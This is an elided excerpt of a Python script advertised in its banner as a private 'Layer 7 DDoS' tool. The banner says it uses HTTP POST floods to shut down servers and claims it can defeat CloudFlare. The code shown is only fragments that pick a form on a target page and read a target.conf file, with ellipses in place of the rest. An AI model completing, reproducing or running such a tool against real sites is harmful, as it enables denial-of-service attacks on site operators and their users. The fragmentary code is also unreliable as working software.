...
//                   `---`                                
//                                              
# Please Don't be a Skid.... Add some of my greets.........................
#
# --------------------------------------------------------------------------------------------------------------------------------------------------------------M--------A-----D----E------B-Y----S--0--u--1-----
# S0u1 - New Layer 7 DDoS Priv8 Tool
#
# The  method is HTTP post to shut down a server aka Layer 7 post enjoy
# This tool can take down CloudFlare ina SNAP *SNAP*
# 
# Facebook Link : https://www.facebook.com/HLoTW/
# author : S0u1 , version 1.0
#----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    ...
    if len(argv) == 2:
        ...
        while u < 1 or u > len(p.getForms().keys()):
            ...
            for url in p.getForms().keys():
                ...
                printurl = base+str(url[len(argv[1]):])
        ...
        try:
            ...
            print "\n[x] No configuration file found.\nCreate target.conf file or enter URL of page with form\n"
            raise SystemExit
